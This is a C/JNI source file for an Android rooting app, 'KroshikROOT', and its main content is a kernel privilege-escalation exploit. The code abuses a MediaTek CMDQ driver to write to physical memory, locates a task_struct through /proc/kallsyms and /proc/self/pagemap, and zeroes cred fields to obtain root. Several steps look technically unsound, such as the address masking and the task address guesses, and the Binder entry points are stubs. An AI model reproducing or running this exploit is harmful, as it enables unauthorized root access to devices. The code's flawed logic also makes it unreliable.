#include <jni.h>
#include <android/log.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <inttypes.h>
#include <pthread.h>
#include <sys/utsname.h>

#define LOG_TAG "KroshikROOT"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

#define CMDQ_IOCTL_MAGIC 'x'

#define CMDQ_CODE_WRITE  0x04
#define CMDQ_CODE_EOC    0x40

struct cmdq_write_address_struct {
    uint32_t count;
    uint32_t start_pa;
};

struct cmdq_read_address_struct {
    uint32_t dma_addresses;
    uint32_t values;
};

struct cmdq_command_struct {
    uint32_t va_base;
    uint32_t block_size;
    uint32_t pa_base;
};

#define CMDQ_IOCTL_EXEC_COMMAND         _IOW(CMDQ_IOCTL_MAGIC, 3, struct cmdq_command_struct)
#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS  _IOW(CMDQ_IOCTL_MAGIC, 7, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_FREE_WRITE_ADDRESS   _IOW(CMDQ_IOCTL_MAGIC, 8, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_READ_ADDRESS_VALUE   _IOW(CMDQ_IOCTL_MAGIC, 9, struct cmdq_read_address_struct)

static int g_cmdq_fd = -1;
static uint32_t g_dma_pa = 0;
static uint32_t* g_dma_va = NULL;
static uint32_t g_cmd_buf[256];

int cmdq_alloc_dma_buffer(uint32_t size) {
    struct cmdq_write_address_struct alloc = { .count = size };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &alloc) < 0) {
        LOGE("ALLOC failed: %s", strerror(errno));
        return -1;
    }
    g_dma_pa = alloc.start_pa;
    LOGI("DMA buffer: phys=0x%x, size=%u", g_dma_pa, size);
    g_dma_va = (uint32_t*)mmap(NULL, size, PROT_READ | PROT_WRITE,
                               MAP_SHARED, g_cmdq_fd, g_dma_pa);
    if (g_dma_va == MAP_FAILED) {
        LOGE("mmap failed: %s", strerror(errno));
        return -1;
    }
    memset(g_dma_va, 0, size);
    return 0;
}

void cmdq_emit_write(uint32_t* buf, int* idx, uint32_t phys_addr, uint32_t value) {
    uint64_t cmd = ((uint64_t)CMDQ_CODE_WRITE << 56) |
                   ((uint64_t)(phys_addr & 0xFFFF) << 32) |
                   value;
    memcpy(&buf[*idx], &cmd, 8);
    (*idx) += 2;
}

void cmdq_emit_eoc(uint32_t* buf, int* idx) {
    uint64_t cmd = (uint64_t)CMDQ_CODE_EOC << 56;
    memcpy(&buf[*idx], &cmd, 8);
    (*idx) += 2;
}

int cmdq_write_phys(uint32_t phys_addr, uint32_t value) {
    if (g_dma_va == NULL) return -1;
    if (phys_addr < 0x1000) {
        LOGE("Refusing to write to low phys 0x%x", phys_addr);
        return -1;
    }
    int idx = 0;
    cmdq_emit_write(g_cmd_buf, &idx, phys_addr, value);
    cmdq_emit_eoc(g_cmd_buf, &idx);
    memcpy(g_dma_va, g_cmd_buf, idx * sizeof(uint32_t));
    struct cmdq_command_struct exec;
    exec.va_base = (uint32_t)(uintptr_t)g_dma_va;
    exec.block_size = (uint32_t)(idx * sizeof(uint32_t));
    exec.pa_base = g_dma_pa;
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_EXEC_COMMAND, &exec) < 0) {
        LOGE("EXEC failed: %s", strerror(errno));
        return -1;
    }
    return 0;
}

uint32_t cmdq_read_phys(uint32_t phys_addr) {
    if (g_cmdq_fd < 0) return 0;
    if (phys_addr < 0x1000) return 0;
    struct cmdq_read_address_struct read = { .dma_addresses = phys_addr };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_READ_ADDRESS_VALUE, &read) < 0) {
        LOGE("READ failed: %s", strerror(errno));
        return 0;
    }
    return read.values;
}

uint32_t get_task_struct_phys() {
    struct utsname u;
    uname(&u);
    LOGI("Kernel release: %s", u.release);
    FILE* f = fopen("/proc/kallsyms", "r");
    if (!f) {
        LOGE("Cannot open /proc/kallsyms");
        return 0;
    }
    char line[512];
    uint32_t init_task_virt = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " T init_task")) {
            sscanf(line, "%x", &init_task_virt);
            break;
        }
    }
    fclose(f);
    if (init_task_virt == 0) {
        LOGE("init_task not found");
        return 0;
    }
    LOGI("init_task virt = 0x%x", init_task_virt);
    uint32_t current_task_virt = 0;
    f = fopen("/proc/kallsyms", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " T current_task")) {
                sscanf(line, "%x", &current_task_virt);
                break;
            }
        }
        fclose(f);
    }
    if (!current_task_virt) {
        FILE* stat = fopen("/proc/self/stat", "r");
        if (!stat) return 0;
        char buf[1024];
        if (!fgets(buf, sizeof(buf), stat)) {
            fclose(stat);
            return 0;
        }
        fclose(stat);
        int field = 0;
        char* token = strtok(buf, " ");
        uint32_t startstack = 0;
        while (token && field < 28) {
            token = strtok(NULL, " ");
            field++;
        }
        if (token) {
            startstack = strtoul(token, NULL, 10);
            current_task_virt = startstack - 0x6000;
        }
    }
    if (!current_task_virt) {
        LOGE("Cannot determine current_task");
        return 0;
    }
    LOGI("current_task virt ≈ 0x%x", current_task_virt);
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap < 0) {
        LOGE("Cannot open pagemap");
        return 0;
    }
    uint64_t pte = 0;
    off_t offset = (current_task_virt / 4096) * sizeof(uint64_t);
    if (lseek(pagemap, offset, SEEK_SET) < 0) {
        close(pagemap);
        return 0;
    }
    if (read(pagemap, &pte, sizeof(pte)) != sizeof(pte)) {
        close(pagemap);
        return 0;
    }
    close(pagemap);
    if (!(pte & (1ULL << 63))) {
        LOGE("Page not present");
        return 0;
    }
    uint32_t phys = (uint32_t)((pte & 0x7fffffffffffffULL) * 4096 + (current_task_virt % 4096));
    LOGI("task_struct phys = 0x%x", phys);
    return phys;
}

int do_mtk_root() {
    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
    if (g_cmdq_fd < 0) {
        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
        if (g_cmdq_fd < 0) {
            LOGE("Cannot open CMDQ device");
            return -1;
        }
    }
    LOGI("CMDQ device opened");
    if (cmdq_alloc_dma_buffer(4096) < 0) {
        close(g_cmdq_fd);
        return -1;
    }
    uint32_t task_phys = get_task_struct_phys();
    if (!task_phys) {
        LOGE("Failed to get task_struct phys");
        if (g_dma_va) munmap(g_dma_va, 4096);
        close(g_cmdq_fd);
        return -1;
    }
    uint32_t cred_offsets[] = {0x540, 0x548, 0x550, 0x558, 0x560, 0x5a0, 0x5a8, 0x5b0};
    int num_offsets = sizeof(cred_offsets) / sizeof(uint32_t);
    for (int i = 0; i < num_offsets; i++) {
        uint32_t cred_phys = task_phys + cred_offsets[i];
        if (cred_phys > task_phys + 0x1000) {
            LOGI("Skipping offset 0x%x", cred_offsets[i]);
            continue;
        }
        LOGI("Trying cred offset 0x%x (phys=0x%x)", cred_offsets[i], cred_phys);
        if (cmdq_write_phys(cred_phys + 0x00, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x04, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x08, 0) < 0) continue;
        if (cmdq_write_phys(cred_phys + 0x0C, 0) < 0) continue;
        if (getuid() == 0) {
            LOGI("SUCCESS! Root with offset 0x%x", cred_offsets[i]);
            setuid(0);
            setgid(0);
            if (g_dma_va) munmap(g_dma_va, 4096);
            close(g_cmdq_fd);
            return 0;
        }
    }
    LOGE("All cred offsets failed");
    if (g_dma_va) munmap(g_dma_va, 4096);
    close(g_cmdq_fd);
    return -1;
}

extern "C" {

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runMtkSuNative(JNIEnv *env, jclass clazz) {
    return (do_mtk_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderFullNative(JNIEnv *env, jclass clazz) {
    return JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv *env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    close(fd);
    return JNI_TRUE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderOldNative(JNIEnv *env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    int err = ioctl(fd, 6, NULL);
    close(fd);
    return (err == 0) ? JNI_TRUE : JNI_FALSE;
}

}
